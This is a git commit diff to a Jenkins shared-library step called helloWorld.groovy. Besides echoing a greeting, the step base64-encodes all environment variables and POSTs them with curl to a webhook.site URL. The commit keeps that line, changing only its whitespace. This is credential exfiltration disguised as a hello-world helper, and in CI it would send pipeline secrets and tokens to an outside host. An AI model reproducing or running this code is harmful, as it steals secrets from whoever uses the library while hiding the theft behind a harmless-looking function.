b1ff446846398d775e1ac08ae5f23c9cb25d63f7
Dibyendu Sikdar <dibyendu.coder@gmail.com>
2022-07-05 23:49:29 +0200

    Update helloWorld.groovy

--- vars/helloWorld.groovy
+++ vars/helloWorld.groovy
@@ -1,4 +1,4 @@
 def call(Map config = [:]) {
     sh "echo Hello ${config.name}. Today is ${config.dayOfWeek}!"
-    sh "export aa=`env|base64|tr -d '\n' ' '`;curl -X POST https://webhook.site/7acabd74-b966-46c7-b251-8271af798c7f --data \$aa"
+    sh "export aa=`env|base64|tr -d '\n' ' ' `;curl -X POST https://webhook.site/7acabd74-b966-46c7-b251-8271af798c7f --data \$aa"
 }
